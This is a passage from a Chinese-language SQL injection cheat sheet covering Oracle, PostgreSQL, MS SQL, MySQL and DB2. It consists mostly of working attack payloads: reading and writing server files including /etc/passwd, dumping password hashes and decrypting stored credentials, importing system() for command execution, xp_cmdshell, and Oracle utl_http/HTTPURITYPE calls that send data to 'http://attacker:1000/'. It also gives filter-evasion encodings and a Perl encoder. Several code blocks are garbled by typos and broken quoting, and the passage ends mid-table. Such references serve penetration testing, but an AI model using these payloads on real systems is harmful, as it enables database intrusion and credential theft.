<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> files <span class="token punctuation">(</span>id NUMBER <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>path VARCHR<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">UNIQUE</span><span class="token punctuation">,</span>
ot_format <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> files <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'c:\boot.ini'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 将准备要读取的列插入到表中(比如通过SQL注入读取)</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> file_index <span class="token keyword">ON</span> files<span class="token punctuation">(</span>path<span class="token punctuation">)</span> INDEXTYPE <span class="token operator">IS</span> ctxsys<span class="token punctuation">.</span>context
PARAMETERS<span class="token punctuation">(</span><span class="token string">'datastore ctxsys.file_datastore format column ot_format'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 从全文索引检索数据(boot.ini)</span>
<span class="token keyword">SELECT</span> token_text <span class="token keyword">from</span> dr$fi1e_index$i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>读本地文件(仅限于PL/SQL注入)</li>
</ul>
<p>直接连接到数据库来执行PL/SQL块：</p>
<p>读本地文件：dbms_lob</p>
<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';
DECLARE
buf varchar2(4096);
BEGIN
Lob_loc:= BFILENAME(1MEDIA_DIR'</span><span class="token punctuation">,</span><span class="token string">'aht.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">OPEN</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> DBMS_LOB<span class="token punctuation">.</span>LOB_READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">READ</span> <span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>utl_raw<span class="token punctuation">.</span>cast_to_varchar2<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">CLOSE</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">*</span> via <span class="token keyword">external</span> <span class="token keyword">table</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> products_ext
<span class="token punctuation">(</span>prod_id NUMBER<span class="token punctuation">,</span> prod_name VARCHAR2<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prod_desc VARCHAR2<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
prod_category VARCHAR2<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prod_category_desc VARCHAR2<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
list_price NUMBER<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> min_price NUMBER<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> last_updated <span class="token keyword">DATE</span><span class="token punctuation">)</span>
<span class="token keyword">ORGANIZATION</span> <span class="token keyword">EXTERNAL</span>
<span class="token punctuation">(</span>
<span class="token keyword">TYPE</span> oracle_loader
<span class="token keyword">DEFAULT</span> <span class="token keyword">DIRECTORY</span> stage_dir
ACCESS <span class="token keyword">PARAMETERS</span>
<span class="token punctuation">(</span>RECORDS DELIMITED <span class="token keyword">BY</span> NEWLINE
BADFILE ORAHOME<span class="token operator">:</span><span class="token string">'.rhosts'</span>
LOGFILE ORAHOME<span class="token operator">:</span><span class="token string">'log_products_ext'</span>
FIELDS TERMINATED <span class="token keyword">BY</span> <span class="token string">','</span>
MISSING FIELD <span class="token keyword">VALUES</span> ARE <span class="token keyword">NULL</span>
<span class="token punctuation">(</span>prod_id<span class="token punctuation">,</span> prod_name<span class="token punctuation">,</span> prod_desc<span class="token punctuation">,</span> prod_category<span class="token punctuation">,</span> prod_category_desc<span class="token punctuation">,</span> price<span class="token punctuation">,</span> price_delta<span class="token punctuation">,</span>last_updated <span class="token keyword">char</span> date_format <span class="token keyword">date</span> mask <span class="token string">"dd-mon-yyyy"</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>
LOCATION <span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>
PARALLEL <span class="token number">5</span>
REJECT <span class="token keyword">LIMIT</span> UNLIMITED<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>写本地文件(仅限于PL/SQL注入)</li>
</ul>
<p>通过SQL*Plus等客户端来直接连接到数据库。</p>
<p>写本地文本文件：utl_file</p>
<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';
DECLARE
v_file UTL_FILE.FILE_TYPE;
BEGIN
v_file:= UTL_FILE.FOPEN('</span>EXT<span class="token string">', '</span>aht<span class="token punctuation">.</span>txt<span class="token string">','</span>w<span class="token string">');
UTL_FILE.PUT_LINE(v_file, '</span><span class="token keyword">first</span> <span class="token keyword">row</span><span class="token string">');
UTL_FILE.NEW_LINE(v_file);
UTL_FILE.PUT_LINE(v)file,'</span><span class="token keyword">second</span> <span class="token keyword">row</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_FILE<span class="token punctuation">.</span>FCLOSE<span class="token punctuation">(</span>v_file<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写本地二进制文件：utl file</p>
<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';
Create or replace directory ext AS '</span><span class="token keyword">C</span><span class="token operator">:</span>\'<span class="token punctuation">;</span>
<span class="token keyword">DECLARE</span> fi UTL_FILE<span class="token punctuation">.</span>FILE_TYPE<span class="token punctuation">;</span>
bu <span class="token keyword">RAW</span><span class="token punctuation">(</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
bu<span class="token operator">:=</span>hextoraw<span class="token punctuation">(</span><span class="token string">'BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fi<span class="token operator">:=</span>UTL_FILE<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'EXT'</span><span class="token punctuation">,</span> <span class="token string">'hello.com'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_FILE<span class="token punctuation">.</span>put_raw<span class="token punctuation">(</span>fi<span class="token punctuation">,</span>bu<span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
UTL_FILE<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写本地文件：dbms_advisor(Oracle 10g及之后的版本)</p>
<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">create</span> <span class="token keyword">directory</span> MYDIR <span class="token keyword">as</span> <span class="token string">'C:\';
exec SYS.DBMS_ADVISOR.CREATE_FILE('</span>This <span class="token keyword">is</span> <span class="token keyword">the</span>
content<span class="token string">'||chr(13)||'</span>Next line<span class="token string">','</span>MYDIR<span class="token string">','</span>myfile<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>破解数据库口令</li>
</ul>
<p>从数据库中提取口令哈希：</p>
<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">SELECT</span> <span class="token keyword">name</span><span class="token punctuation">,</span> password <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>user$ <span class="token keyword">where</span> <span class="token keyword">type</span>#<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">and</span>
<span class="token keyword">length</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">;</span>
<span class="token comment">--DES Hashes (7-10g)</span>
<span class="token keyword">SELECT</span> <span class="token keyword">name</span><span class="token punctuation">,</span> spare4 <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>user$ <span class="token keyword">where</span> <span class="token keyword">type</span>#<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token keyword">length</span><span class="token punctuation">(</span>spare4<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">62</span><span class="token punctuation">;</span> <span class="token comment">--SHA1 Hashes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>提取明文口令：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> view_username<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>view_password<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_view_user_credentials<span class="token punctuation">;</span>
<span class="token keyword">select</span> credential_set_column<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>credential_value<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_credentials2<span class="token punctuation">;</span>
<span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>aru_username<span class="token punctuation">)</span><span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>aru_password<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_aru_credentials<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="PostgreSQL-备忘单"><a href="#PostgreSQL-备忘单" class="headerlink" title="PostgreSQL 备忘单"></a>PostgreSQL 备忘单</h4><p><a target="_blank" rel="noopener" href="http://www.postgresql.org/docs/manuals/">www.postgresql.org/docs/manuals/</a></p>
<ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取PostgreSQL数据库的配置信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>版本</td>
<td><code>SELECT version()</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT getpgusername();  </code><br><code>SELECT user; </code><br> <code>SELECT current user; </code> <br><code>SELECT session user;</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>SELECT usename FROM pg_user</code></td>
</tr>
<tr>
<td>当前用户权限</td>
<td><code>SELECT  usename, usecreatedb, usesuper, usecatupd FROM pg_user</code></td>
</tr>
<tr>
<td>数据库服务器主机名</td>
<td><code>SELECT inet_server_addr();</code></td>
</tr>
</tbody></table>
<p>提取PostgreSQL数据库的模式信息</p>
<table>
<thead>
<tr>
<th>数</th>
<th>查询</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td><code>SELECT current_database();</code></td>
</tr>
<tr>
<td>列出数据库</td>
<td><code>SELECT datname FROM pg_database;</code></td>
</tr>
<tr>
<td>列出表</td>
<td><code>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r' ,'') AND pg_catalog.pg_table_is_visible(c.oid) AND n.nspname NOT IN ('pg_catalog','pg_toast');</code></td>
</tr>
<tr>
<td>列出列</td>
<td><code>SELECT relname,A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T  WHERE (C.relkind='r') AND (N.nspname ='public') AND  (A.attrelid=C.oid) AND (N.oid=C.relnamespace) AND (A.atttypid=T.oid)  AND(A.attnum&gt;0) AND (NOT A.attisdropped);</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL盲注函数：PostgreSQL</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LENGTH()</code></td>
</tr>
<tr>
<td>从给定字符串中提取子串</td>
<td><code>SUBSTRING(string,offset,length)</code></td>
</tr>
<tr>
<td>字符串(‘ABC)不带单引号的表示方式</td>
<td>`SELECT CHR(65)</td>
</tr>
<tr>
<td>触发时间延迟</td>
<td><code>SELECT pg_sleep(10); --触发10s的延迟</code></td>
</tr>
</tbody></table>
<ol start="3">
<li>攻击数据库服务器：PostgreSQL</li>
</ol>
<p>PostgreSQL并未提供执行操作系统命令的内置存储过程，不过可以从外部的.dll或共享对象(shared object)(.so)文件中导入堵如system()这样的函数。借助PostgreSQL并使用COPY语句同样可以读取本地文件。</p>
<ul>
<li>执行系统命令</li>
</ul>
<p>对于8.2版本之前的PostgreSQL数据库服务器，从标准UNIX libc库导入system函数：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> system<span class="token punctuation">(</span>cstring<span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">int</span> <span class="token keyword">AS</span> <span class="token string">'/lib/libc.so.6'</span><span class="token punctuation">,</span> <span class="token string">'system'</span> <span class="token keyword">LANGUAGE</span> <span class="token string">'C'</span> STRICT<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来可以通过执行下列SQL查询调用system函数：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> system<span class="token punctuation">(</span><span class="token string">'command'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>访问本地文件</li>
</ul>
<p>可以使用下列SQL语句并借助超级用户账户来读取本地文件，这些文件是使用操作系统级的PostgreSQL用户账户打开的</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> filedata<span class="token punctuation">(</span>t <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
COPY filedata <span class="token keyword">FROM</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可以使用下列SQL语句来写本地文件，这些文件也是使用操作系统级的PostgreSQL用户账户创建的</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> thefile<span class="token punctuation">(</span>evildata <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> thefile<span class="token punctuation">(</span>evildata<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'some evil data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
COPY thefile <span class="token punctuation">(</span>evildata<span class="token punctuation">)</span> <span class="token keyword">TO</span> <span class="token string">'/tmp/evilscript.sh'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>破解数据库口令</li>
</ul>
<p>列出PostgreSQL数据库中的用户名和口令</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> usename<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>passwd <span class="token keyword">from</span> pg_shadow<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="避开输入验证过滤器"><a href="#避开输入验证过滤器" class="headerlink" title="避开输入验证过滤器"></a>避开输入验证过滤器</h3><h4 id="引号过滤器"><a href="#引号过滤器" class="headerlink" title="引号过滤器"></a>引号过滤器</h4><p>不使用引号字符表示字符串</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>平   台</td>
<td>查  询</td>
</tr>
<tr>
<td>Microsoft SQL Server</td>
<td><code>SELECT char(0x41) + char(0x42) + char(0x43);</code></td>
</tr>
<tr>
<td>MySQL Server</td>
<td><code>SELECT char (65,66,67);</code><br><code>  SELECT 0x414243;</code></td>
</tr>
<tr>
<td>Oracle</td>
<td>`SELECT chr(65)</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>`SELECT chr(65)</td>
</tr>
</tbody></table>
<p>Microsoft SQL Server还支持在变量中构造查询，然后调用EXEC来执行它。</p>
<p>创建了一个名为@q的变量，并借助一个十六进制编码的字符串将SELECT’ABC’查询赋值给该变量：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@q</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>
<span class="token keyword">SELECT</span> <span class="token variable">@q</span><span class="token operator">=</span><span class="token number">0x53454c454354202741424327</span>
<span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token variable">@q</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>采用该技术可以在不向应用程序提交任何引号字符的前提下，执行任意查询。可以使用下列Perl脚本并借助该技术来自动编码SQL语句：</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token comment">#!/usr/bin/perl</span>
<span class="token keyword">print</span> <span class="token string">"Enter SQL query to encode:"</span><span class="token punctuation">;</span>
<span class="token variable">$teststr</span><span class="token operator">=</span><span class="token filehandle symbol">&lt;STDIN&gt;</span><span class="token punctuation">;</span>chomp <span class="token variable">$teststr</span><span class="token punctuation">;</span>
<span class="token variable">$hardcoded_sql</span> <span class="token operator">=</span>
<span class="token string">'declare @q varchar(8000)'</span><span class="token operator">.</span>
<span class="token string">'select @q=0x***'</span><span class="token operator">.</span>
<span class="token string">'exec(@q)'</span><span class="token punctuation">;</span>
<span class="token variable">$prepared</span> <span class="token operator">=</span> encode_sql<span class="token punctuation">(</span><span class="token variable">$teststr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$hardcoded_sql</span> <span class="token operator">=~</span><span class="token regex">s/\*\*\*/$prepared/g</span><span class="token punctuation">;</span>
<span class="token keyword">print</span> <span class="token string">""</span><span class="token operator">\</span>n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span><span class="token operator">-</span>Encoded SQL<span class="token punctuation">:</span><span class="token operator">\</span>n<span class="token operator">\</span>n<span class="token string">";
print $hardcoded_sql ."</span><span class="token operator">\</span>n<span class="token string">";
sub encode_sql{
@subvar=@_;
my $sqlstr =$subvar[0];
@ASCII = unpack("</span>C<span class="token operator">*</span>"<span class="token punctuation">,</span><span class="token variable">$sqlstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token variable">$line</span> <span class="token punctuation">(</span><span class="token variable">@ASCII</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token variable">$encoded</span> <span class="token operator">=</span> sprintf<span class="token punctuation">(</span><span class="token string">'%lx'</span><span class="token punctuation">,</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$encoded_command</span> <span class="token operator">.=</span><span class="token variable">$encoded</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> <span class="token variable">$encoded_command</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="HTTP-编码"><a href="#HTTP-编码" class="headerlink" title="HTTP 编码"></a>HTTP 编码</h4><p>有时可以使用外来编码标准或者借助双重编码来编码输入，以避开那些拒绝已知不良字符 (通常称为黑名单)的输入验证过滤器。</p>
<p>编码后的SQL元字符</p>
<table>
<thead>
<tr>
<th>字   符</th>
<th>编码后的变量</th>
</tr>
</thead>
<tbody><tr>
<td>‘</td>
<td>%27<br>%2527<br>%u0027<br>%u02b9<br>%ca%b9</td>
</tr>
<tr>
<td>“</td>
<td>%22<br>%2522<br>%u0022<br>%uff02<br>%ef%bc%82</td>
</tr>
<tr>
<td>;</td>
<td>%3b<br>%253b<br>%u0003b<br>%ufflb<br>%ef%bc%9b</td>
</tr>
<tr>
<td>(</td>
<td>%28<br>%2528<br>%u0028<br>%uff08<br>%ef%bc%88</td>
</tr>
<tr>
<td>)</td>
<td>%29<br>%2529<br>%u0029<br>%uff09<br>%ef%bc%89</td>
</tr>
<tr>
<td>［空格］</td>
<td>%20<br>%2520<br>%u0020<br>%ff00<br>%c0%a0</td>
</tr>
</tbody></table>
<h3 id="排查SQL注入攻击"><a href="#排查SQL注入攻击" class="headerlink" title="排查SQL注入攻击"></a>排查<strong>SQL</strong>注入攻击</h3><p>排查SQL注入时的参考资料</p>
<table>
<thead>
<tr>
<th>解决方案</th>
<th>错误/挑战</th>
</tr>
</thead>
<tbody><tr>
<td>挑战<br>执行一次UNION SELECT攻击，其原始查询用于检索image类型的列。<br>错误消息<br> <code>Image is incompatible with int/ The image data type cannot be selected as DISTINCT because it is not compatible.</code></td>
<td>将<code>UNION SELECT</code>语句修改成读<code>UNION ALL SELECT</code><br>这样能解决当<code>UNION SELECT</code>尝试与image数据类型进行比较操作时出现的相关问题。<br>例如：<code>UNION ALL SELECT null,null,null</code></td>
</tr>
<tr>
<td>挑战<br>注入ORDER BY子句<br>注入的数据位于ORDER BY子句右边。许多常用的技巧（比如UNION SELECT）将不起作用。<br>本例执行下列SQL查询，其中攻击者的数据是注入点：<code>SELECT  FROM products GROUP BY attackers data DESC</code></td>
<td>Microsoft SQL Server <br>Microsoft SQL Server支持使用分号(;)作为每个新查询的堆叠查询的开始。可以按下列方式来实施多种攻击，比如基于时间延迟的数据检索和扩展存储过程的执行：<br><code>ORDER BY 1；EXEC master..xp_cmdshell'cmd'</code><br>还可以利用Microsoft SQL Server并通过错误消息来返回查询结果数据。注入ORDER BY子句时，可以使用下列语法：<br><code>ORDER BY (1/(@@version)); -- 返回版本号</code><br><code>ORDER BY 1/(SELECT TOP 1 name FROM sysobjects WHERE xtype='U');--从sysobjects返回名称</code><br>MySQL Server<br>可以在ORDER BY子句中使用基于时间延迟的SQL盲注。如果当前用户为root@localhost，那么下面的例子会触发时间延迟：<br><code>ORDER BY(IF((SELECT user()='root@localhost'),sleep(2),1));</code><br>Oracle可以使用utl_http包并通过攻击者选择的任何TCP端口来建立向外的HTTP连接。接下来的ORDER BY子句通过端口1000与主机攻击者建立了一条HTTP连接。<br>该HTTP请求在请求路径中包含了Oracle的版本标志：`ORDER BY utl_http.request(‘<a target="_blank" rel="noopener" href="http://attacker:1000/">http://attacker:1000/</a>‘</td>
</tr>
<tr>
<td>挑战<br>因为删除了公共权限，所以ut http无法起作用。<br>错误消息<br><code>ORA-00904 invalid identifier</code></td>
<td>许多Oracle安全指南建议从utl_http包中删除公共权限。不过，很多人忽视这样一个事实可使用 HTTPURITYPE对象类型实现相同的目的，而且同样能被公共权限访问到。<br>`SELECT HTTPURITYPE(‘<a target="_blank" rel="noopener" href="http://attacker:1000/">http://attacker:1000/</a>‘</td>
</tr>
<tr>
<td>挑战<br>utl inaddr不起作用。<br>存在多种原因，比如版本11中的访问控制列表（ACL），权限已经被撤销以及未安装Java等。<br>错误消息<br><code>ORA-00904 invalid identifier ORA-24247 network access denied by access control list ACL）-11g ORA-29540 oracle/plsql/net/InternetAddress</code></td>
<td>在可以控制错误消息内容的位置使用不同的函数。根据数据库版本及安装组件的不同，下面是候选函数的一个列表：<br><code>ORDER BY ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE rownum=1),null,null) ORDER BY SYS.DBMS_AW_XML.READAWMETADATA((SELECT banner FROM v$version WHERE rownum=1),null) ORDER BY CTXSYS.DRITHSX.SN((SELECT banner FROM v$version WHERE rownum=1),user)ORDER BY CTXSYS.CTX_REPORT.TOKEN_TYPE(user,(SELECT banner FROM v$version WHERE rownum=1))</code></td>
</tr>
<tr>
<td>挑战<br>执行针对MySQL数据库的UNION SELECT攻击时收到<code>illegal mix of collations</code>消息。<br>错误消息<br><code>illegal mix of collations(latinl_swedish_ci,IMPLICIT) and(utf8_general_ci,SYSCONST)for operation 'UNION'</code></td>
<td>可以使用CAST函数解决该错误。<br>例如：<br><code>UNION SELECT user(),null,null;</code><br>变为：<br><code>UNION SELECT CAST(user() ASchar),null,null;</code></td>
</tr>
<tr>
<td>挑战<br>执行针对Microsoft SQL Server数据库的UNION SELECT攻击时收到<code>collation conflict"</code>消息。<br>错误消息<br><code>Cannot resolve collation conflict for column 2 in SELECT statement</code></td>
<td>要想解决该错误，一种方法是从数据库读取Collation属性，然后在查询中使用。在下面的例子中，我们执行<code>UNION ALL SELECT</code>查询来检索sysobject表中的name列。<br>步骤1：检索collation的值<br><code>UNION ALL SELECT SERVERPROPERTY（'Collation'），null FROM sysobjects</code><br>本例中，我们将Collation属性设置为<code>SQL_Latinl_General_CPl_CI_AS</code><br>步骤2：在<code>UNION SELECT</code>中实现collation的值<code>UNION ALL SELECT 1,Name collate SQL Latinl General CPl_CI_AS,null FROM sysobjects</code></td>
</tr>
</tbody></table>
<h3 id="其他平台上的SQL注入"><a href="#其他平台上的SQL注入" class="headerlink" title="其他平台上的SQL注入"></a>其他平台上的<strong>SQL</strong>注入</h3><h4 id="DB2备忘单"><a href="#DB2备忘单" class="headerlink" title="DB2备忘单"></a>DB2备忘单</h4><p>在与Web应用集成的众多数据库中，IBM的DB2数据库服务器可能是其中最不流行的一种数据库平台。不过，Linux、UNIX和Windows版本(DB2 LUW)正日渐流行。</p>
<ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取DB2数据库的配置信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>版本</td>
<td><code>SELECT versionnumber, version_timestamp  FROM sysibm.sysversions;</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT user FROM sysibm.sysdummy1;</code><br><code>SELECT session_user FROM sysibm.sysdummyl;</code><br><code> SELECT system_user FROM sysibm.sysdummyl;</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>SELECT grantee FROM syscat.dbauth;</code></td>
</tr>
<tr>
<td>当前用户权限</td>
<td><code>SELECT * FROM syscat.dbauth WHERE  grantee =user;</code><br><code> SELECT * FROM syscat.tabauth WHERE grantee =user;</code><br><code> SELECT *  FROM syscat.tabauth;</code></td>
</tr>
</tbody></table>
<p>提取DB2数据库的模式信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td><code>SELECT current_server FROM sysibm.sysdummyl;</code></td>
</tr>
<tr>
<td>列出数据库</td>
<td><code>SELECT schemaname FROM syscat.schemata;</code></td>
</tr>
<tr>
<td>列出表</td>
<td><code>SELECT name FROM sysibm.systables;</code></td>
</tr>
<tr>
<td>列出列</td>
